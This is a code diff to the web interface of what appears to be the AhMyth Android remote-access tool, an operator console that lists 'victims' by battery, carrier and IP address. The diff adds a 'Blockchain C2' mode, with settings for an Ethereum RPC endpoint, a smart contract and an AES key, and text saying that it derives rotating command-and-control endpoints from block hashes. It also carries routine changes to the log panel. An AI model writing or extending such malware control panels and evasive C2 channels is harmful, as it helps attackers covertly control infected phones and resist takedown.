@@ -22,6 +22,7 @@
         if (window.module) module = window.module;
         
         document.addEventListener('DOMContentLoaded', function() {
+            // Fomantic UI bindings
             setTimeout(function() {
                 if (typeof $ !== 'undefined') {
                     $('.menu .item').tab();
@@ -29,6 +30,7 @@
                     $('.ui.checkbox').checkbox();
                 }
             }, 200);
+
         });
     </script>
 
@@ -36,6 +38,14 @@
     <link rel="stylesheet" href="assets/css/mystyle.css">
 
     <style>
+        :root {
+            --log-panel-height: 200px;
+        }
+        
+        body.log-resize-active {
+            cursor: row-resize;
+        }
+        
         /* Prevent white flash - set dark background immediately */
         html, body {
             background: #0d1117 !important;
@@ -239,16 +249,41 @@
         
         /* Log */
         #log {
-            /* Removed fixed height, min-height, max-height */
             display: flex;
             flex-direction: column;
             background: var(--bg-primary);
             border-top: 1px solid var(--border-color);
             border-radius: 0 0 10px 10px;
-            overflow: auto; /* Changed to auto for scrollability */
-            resize: vertical; /* Allow vertical resizing */
-            min-height: 50px; /* Minimum height to prevent collapse */
-            max-height: 80vh; /* Maximum height to not cover entire screen */
+            overflow: hidden;        /* Don't scroll the container, only log-content */
+            height: var(--log-panel-height, 200px);
+            min-height: 120px;
+            max-height: 70vh;
+            flex-shrink: 0;
+            -webkit-app-region: no-drag;  /* Prevent window drag on log panel */
+            position: relative;
+        }
+        
+        .log-resizer {
+            height: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: row-resize;
+            user-select: none;
+            margin-bottom: 16px;
+        }
+        
+        .log-resizer__handle {
+            width: 120px;
+            height: 4px;
+            border-radius: 999px;
+            background: var(--border-color);
+            box-shadow: 0 1px 4px rgba(0, 0, 0, 0.4);
+            transition: background 0.2s ease;
+        }
+        
+        .log-resizer:hover .log-resizer__handle {
+            background: var(--accent-primary);
         }
         
         .log-header {
@@ -259,7 +294,7 @@
             background: var(--bg-secondary);
             border-bottom: 1px solid var(--border-color);
             flex-shrink: 0;
-            cursor: ns-resize; /* Indicate resizable area */
+            -webkit-app-region: no-drag;  /* Prevent window drag on header */
         }
         
         .log-header__title {
@@ -270,10 +305,11 @@
         }
         
         .log-content {
-            flex: 1;
-            min-height: 0;
+            flex: 1 1 auto;
+            min-height: 0;           /* Critical for flex child scrolling */
+            height: 100%;            /* Fill remaining space */
             padding: 8px 12px;
-            overflow-y: auto;
+            overflow-y: scroll;      /* Always show scrollbar */
             overflow-x: hidden;
             scroll-behavior: smooth;
             font-family: var(--font-mono);
@@ -282,6 +318,7 @@
             -webkit-user-select: text;
             cursor: text;
             -webkit-overflow-scrolling: touch;
+            -webkit-app-region: no-drag;  /* Prevent window drag, allow scroll */
         }
         
         /* Custom scrollbar for console log */
@@ -419,6 +456,27 @@
             line-height: 1.6;
             scroll-behavior: smooth;
             -webkit-overflow-scrolling: touch;
+        }
+        
+        .logs-body {
+            flex: 1;
+            min-height: 0;
+            overflow-y: auto;
+            overflow-x: hidden;
+            padding: 12px;
+            background: #0d1117;
+            -webkit-app-region: no-drag;
+        }
+        
+        .logs-output {
+            margin: 0;
+            padding: 0;
+            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+            font-size: 12px;
+            line-height: 1.5;
+            color: #c9d1d9;
+            white-space: pre-wrap;
+            word-break: break-word;
         }
         
         /* Custom scrollbar for logs */
@@ -563,9 +621,10 @@
             opacity: 0.5;
         }
     </style>
+<style>[ng-cloak],[data-ng-cloak],.ng-cloak{display:none !important;}</style>
 </head>
 
-<body ng-controller="AppCtrl" class="draggable">
+<body ng-controller="AppCtrl" ng-cloak>
     <div class="main-container">
         <!-- Title Bar -->
         <div class="title-bar">
@@ -606,6 +665,10 @@
                 <i class="terminal icon"></i>
                 Logs
             </a>
+            <a class="tab-nav__item" data-tab="blockchain-logs">
+                <i class="linkify icon"></i>
+                Blockchain Logs
+            </a>
             <a class="tab-nav__item" data-tab="settings">
                 <i class="cog icon"></i>
                 Settings
@@ -628,19 +691,25 @@
                         </div>
                     </div>
                     <div class="header-panel__controls">
-                        <div class="server-status" ng-class="{'server-status--listening': isListen, 'server-status--stopped': !isListen}">
+                        <div class="server-status" ng-class="{'server-status--listening': isListen || blockchainListening, 'server-status--stopped': !isListen && !blockchainListening}">
                             <span class="server-status__dot"></span>
-                            <span ng-if="isListen">Listening</span>
-                            <span ng-if="!isListen">Stopped</span>
+                            <span ng-if="isListen && blockchainListening">TCP + Blockchain</span>
+                            <span ng-if="isListen && !blockchainListening">TCP Listening</span>
+                            <span ng-if="!isListen && blockchainListening">Blockchain Only</span>
+                            <span ng-if="!isListen && !blockchainListening">Stopped</span>
+                        </div>
+                        <div class="server-controls__status" ng-if="blockchainListening" style="margin-left: 10px;">
+                            <span class="status-dot status-dot--blockchain" style="background: #9945FF;"></span>
+                            <span style="color: #9945FF;">Blockchain</span>
                         </div>
                         <div class="server-controls__input-group">
                             <span class="server-controls__label">Port</span>
                             <input type="text" class="server-controls__input" ng-model="port" placeholder="42474">
                         </div>
-                        <button class="btn btn--primary" ng-click="clearLogs(); Listen(port)" ng-disabled="isListen">
+                        <button class="btn btn--primary" ng-click="clearLogs(); Listen(port)" ng-disabled="isListen || blockchainListening">
                             <i class="play icon"></i> Listen
                         </button>
-                        <button class="btn btn--danger" ng-click="clearLogs(); StopListening(port)" ng-disabled="!isListen">
+                        <button class="btn btn--danger" ng-click="clearLogs(); StopListening(port)" ng-disabled="!isListen && !blockchainListening">
                             <i class="stop icon"></i> Stop
                         </button>
                     </div>
@@ -650,8 +719,8 @@
                 <div class="victims-container">
                     <div class="victims-header">
                         <span class="victims-header__title">Connected Devices</span>
-                        <span class="badge badge--success">{{getOnlineCount() || 0}} online</span>
-                        <span class="badge badge--secondary" ng-if="getOfflineCount() > 0">{{getOfflineCount()}} offline</span>
+                        <span class="badge badge--success" ng-bind="(getOnlineCount() || 0) + ' online'"></span>
+                        <span class="badge badge--secondary" ng-if="getOfflineCount() > 0" ng-bind="getOfflineCount() + ' offline'"></span>
                     </div>
                     <div class="victims-content">
                         <table class="victims-table" ng-if="getVictimCount() > 0">
@@ -664,6 +733,7 @@
                                     <th style="width: 65px;">Battery</th>
                                     <th>Operator</th>
                                     <th>IP Address</th>
+                                    <th style="width: 90px;">Conn</th>
                                     <th style="width: 80px;">Status</th>
                                 </tr>
                             </thead>
@@ -702,7 +772,11 @@
                                         <span class="operator-name">{{victim.operator || 'Unknown'}}</span>
                                     </td>
                                     <td>
-                                        <span class="ip-address">{{victim.ip}}:{{victim.port}}</span>
+                                        <span class="ip-address" ng-if="victim.country === 'BC' || victim.ip === 'Blockchain'">{{victim.walletAddress || victim.ip}}</span>
+                                        <span class="ip-address" ng-if="victim.country !== 'BC' && victim.ip !== 'Blockchain'">{{victim.ip}}:{{victim.port}}</span>
+                                    </td>
+                                    <td>
+                                        <span class="operator-name">{{victim.conn || victim.connectionType || (victim.country === 'BC' || victim.ip === 'Blockchain' || victim.isBlockchain ? 'blockchain' : 'tcp')}}</span>
                                     </td>
                                     <td>
                                         <span class="victims-table__status victims-table__status--online" ng-if="victim.isOnline !== false">
@@ -736,23 +810,23 @@
                     <div class="stats-grid">
                         <div class="stat-card stat-card--primary">
                             <i class="desktop icon"></i>
-                            <div class="stat-value">{{getOnlineCount() || 0}}</div>
+                            <div class="stat-value" ng-bind="getOnlineCount() || 0"></div>
                             <div class="stat-label">Online Devices</div>
                         </div>
                         <div class="stat-card stat-card--warning">
                             <i class="moon icon"></i>
-                            <div class="stat-value">{{getOfflineCount() || 0}}</div>
+                            <div class="stat-value" ng-bind="getOfflineCount() || 0"></div>
                             <div class="stat-label">Offline Devices</div>
                         </div>
                         <div class="stat-card stat-card--info">
                             <i class="history icon"></i>
-                            <div class="stat-value">{{getVictimCount() || 0}}</div>
+                            <div class="stat-value" ng-bind="getVictimCount() || 0"></div>
                             <div class="stat-label">Total Sessions</div>
                         </div>
                         <div class="stat-card stat-card--success">
                             <i class="server icon"></i>
-                            <div class="stat-value" ng-if="isListen">Active</div>
-                            <div class="stat-value" ng-if="!isListen">Stopped</div>
+                            <div class="stat-value" ng-if="isListen || blockchainListening">Active</div>
+                            <div class="stat-value" ng-if="!isListen && !blockchainListening">Stopped</div>
                             <div class="stat-label">Server Status</div>
                         </div>
                     </div>
@@ -775,11 +849,11 @@
                         <div class="quick-stats">
                             <div class="quick-stat">
                                 <span class="quick-stat__label">Server Port</span>
-                                <span class="quick-stat__value">{{port || 'Not set'}}</span>
+                                <span class="quick-stat__value" ng-bind="port || 'Not set'"></span>
                             </div>
                             <div class="quick-stat">
                                 <span class="quick-stat__label">Platform</span>
-                                <span class="quick-stat__value">{{platform}}</span>
+                                <span class="quick-stat__value" ng-bind="platform"></span>
                             </div>
                             <div class="quick-stat">
                                 <span class="quick-stat__label">Version</span>
@@ -848,7 +922,7 @@
                             <button class="btn btn--small btn--secondary" ng-click="toggleAutoScroll()" title="Auto-scroll">
                                 <i class="arrow down icon" ng-if="autoScrollLogs"></i>
                                 <i class="pause icon" ng-if="!autoScrollLogs"></i>
-                                {{autoScrollLogs ? 'Auto-scroll ON' : 'Auto-scroll OFF'}}
+                                <span ng-bind="autoScrollLogs ? 'Auto-scroll ON' : 'Auto-scroll OFF'"></span>
                             </button>
                             <label class="logs-filter">
                                 <input type="checkbox" ng-model="logFilters.request" ng-change="applyLogFilters()"> Requests
@@ -899,6 +973,31 @@
                 </div>
             </div>
 
+            <!-- Blockchain Logs Tab -->
+            <div class="tab-content" data-tab="blockchain-logs">
+                <div class="logs-panel">
+                    <div class="logs-header">
+                        <h2 class="logs-title">
+                            <i class="linkify icon"></i>
+                            Blockchain Logs
+                        </h2>
+                        <div class="logs-controls">
+                            <button class="btn btn--small btn--secondary" ng-click="clearBlockchainLogs()" title="Clear logs">
+                                <i class="trash icon"></i> Clear
+                            </button>
+                            <button class="btn btn--small btn--secondary" ng-click="toggleBlockchainAutoScroll()" title="Auto-scroll">
+                                <i class="arrow down icon" ng-if="autoScrollBlockchainLogs"></i>
+                                <i class="pause icon" ng-if="!autoScrollBlockchainLogs"></i>
+                                <span ng-bind="autoScrollBlockchainLogs ? 'Auto-scroll ON' : 'Auto-scroll OFF'"></span>
+                            </button>
+                        </div>
+                    </div>
+                    <div class="logs-body">
+                        <pre class="logs-output" id="blockchainLogs" ng-bind="blockchainLogs"></pre>
+                    </div>
+                </div>
+            </div>
+
             <!-- Settings Tab -->
             <div class="tab-content" data-tab="settings">
                 <div class="settings-panel">
@@ -915,6 +1014,51 @@
                                 <span class="settings-label">Auto-start Server</span>
                                 <input type="checkbox" ng-model="autoStartServer">
                             </label>
+                        </div>
+                    </div>
+
+                    <div class="settings-section">
+                        <h3><i class="linkify icon"></i> Blockchain C2 Configuration</h3>
+                        <div class="settings-group">
+                            <label class="settings-item">
+                                <span class="settings-label">Enable Blockchain C2</span>
+                                <input type="checkbox" ng-model="blockchainC2Enabled" ng-change="saveBlockchainC2Config()">
+                            </label>
+                            <label class="settings-item">
+                                <span class="settings-label">RPC URL</span>
+                                <input type="text" class="settings-input" ng-model="blockchainC2RpcUrl" placeholder="https://mainnet.infura.io/v3/YOUR_PROJECT_ID" ng-change="saveBlockchainC2Config()">
+                                <small class="settings-hint">Ethereum RPC endpoint (Infura, Alchemy, QuickNode)</small>
+                            </label>
+                            <label class="settings-item">
+                                <span class="settings-label">Contract Address (Optional)</span>
+                                <input type="text" class="settings-input" ng-model="blockchainC2Contract" placeholder="0x0000000000000000000000000000000000000000" ng-change="saveBlockchainC2Config()">
+                                <small class="settings-hint">Smart contract address for on-chain endpoints</small>
+                            </label>
+                            <label class="settings-item">
+                                <span class="settings-label">Block Step</span>
+                                <input type="number" class="settings-input" ng-model="blockchainC2BlockStep" min="1" max="100" placeholder="10" ng-change="saveBlockchainC2Config()">
+                                <small class="settings-hint">Block interval for endpoint rotation</small>
+                            </label>
+                            <label class="settings-item">
+                                <span class="settings-label">Candidates Per Cycle</span>
+                                <input type="number" class="settings-input" ng-model="blockchainC2Candidates" min="1" max="20" placeholder="5" ng-change="saveBlockchainC2Config()">
+                                <small class="settings-hint">Number of endpoint candidates per rotation</small>
+                            </label>
+                            <label class="settings-item">
+                                <span class="settings-label">AES Key (Hex, 64 chars)</span>
+                                <input type="text" class="settings-input" ng-model="blockchainC2AesKey" placeholder="0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef" maxlength="64" ng-change="saveBlockchainC2Config()">
+                                <small class="settings-hint">32-byte AES key in hexadecimal format (set via environment variable: BLOCKCHAIN_C2_AES_KEY)</small>
+                            </label>
+                            <div class="info-box" style="margin-top: 12px; padding: 12px; background: rgba(33, 150, 243, 0.1); border-left: 3px solid #2196F3; border-radius: 4px;">
+                                <p style="margin: 0; font-size: 12px; color: var(--text-primary);">
+                                    <i class="info circle icon"></i> <strong>Blockchain C2:</strong> Uses blockchain block hashes to generate rotating C2 endpoints. 
+                                    Requires RPC access and optional smart contract. Falls back to TCP/IP if unavailable.
+                                    <br><br>
+                                    <strong>Setup:</strong> Get free RPC access from <a href="https://infura.io" target="_blank">Infura</a>, 
+                                    <a href="https://alchemy.com" target="_blank">Alchemy</a>, or 
+                                    <a href="https://quicknode.com" target="_blank">QuickNode</a>.
+                                </p>
+                            </div>
                         </div>
                     </div>
 
@@ -984,6 +1128,9 @@
                 </div>
             </div>
         </div>
+        <div class="log-resizer" id="logResizer" title="Drag to resize console">
+            <div class="log-resizer__handle"></div>
+        </div>
     </div>
 
     <script>
@@ -1023,6 +1170,73 @@
                         return false;
                     }
                 });
+            }
+            
+            // Allow console log panel height to be resized and persisted
+            const LOG_HEIGHT_KEY = 'ahmyth.logPanelHeight';
+            const logElement = document.getElementById('log');
+            const logResizer = document.getElementById('logResizer');
+            if (logElement && logResizer) {
+                const clampHeight = (value) => {
+                    const min = 120;
+                    const max = Math.max(window.innerHeight * 0.75, 260);
+                    return Math.min(Math.max(value, min), max);
+                };
+                const applyHeight = (value) => {
+                    const clamped = clampHeight(value);
+                    document.documentElement.style.setProperty('--log-panel-height', clamped + 'px');
+                    try {
+                        localStorage.setItem(LOG_HEIGHT_KEY, clamped);
+                    } catch (_) {}
+                };
+                let savedHeight = null;
+                try {
+                    const stored = localStorage.getItem(LOG_HEIGHT_KEY);
+                    savedHeight = stored != null ? parseInt(stored, 10) : null;
+                } catch (_) {}
+                if (typeof savedHeight === 'number' && !Number.isNaN(savedHeight)) {
+                    applyHeight(savedHeight);
+                }
+                let startY = 0;
+                let startHeight = logElement.getBoundingClientRect().height;
+                const stopMouseResize = () => {
+                    document.body.classList.remove('log-resize-active');
+                    window.removeEventListener('mousemove', handleMouseMove);
+                    window.removeEventListener('mouseup', stopMouseResize);
+                };
+                const handleMouseMove = (event) => {
+                    event.preventDefault();
+                    const delta = event.clientY - startY;
+                    applyHeight(startHeight + delta);
+                };
+                logResizer.addEventListener('mousedown', (event) => {
+                    event.preventDefault();
+                    startY = event.clientY;
+                    startHeight = logElement.getBoundingClientRect().height;
+                    document.body.classList.add('log-resize-active');
+                    window.addEventListener('mousemove', handleMouseMove);
+                    window.addEventListener('mouseup', stopMouseResize);
+                });
+                
+                const handleTouchMove = (event) => {
+                    if (!event.touches || !event.touches.length) return;
+                    event.preventDefault();
+                    const touch = event.touches[0];
+                    applyHeight(startHeight + (touch.clientY - startY));
+                };
+                const stopTouchResize = () => {
+                    document.body.classList.remove('log-resize-active');
+                    window.removeEventListener('touchmove', handleTouchMove);
+                    window.removeEventListener('touchend', stopTouchResize);
+                };
+                logResizer.addEventListener('touchstart', (event) => {
+                    if (!event.touches || !event.touches.length) return;
+                    startY = event.touches[0].clientY;
+                    startHeight = logElement.getBoundingClientRect().height;
+                    document.body.classList.add('log-resize-active');
+                    window.addEventListener('touchmove', handleTouchMove, { passive: false });
+                    window.addEventListener('touchend', stopTouchResize);
+                }, { passive: false });
             }
         });
     </script>
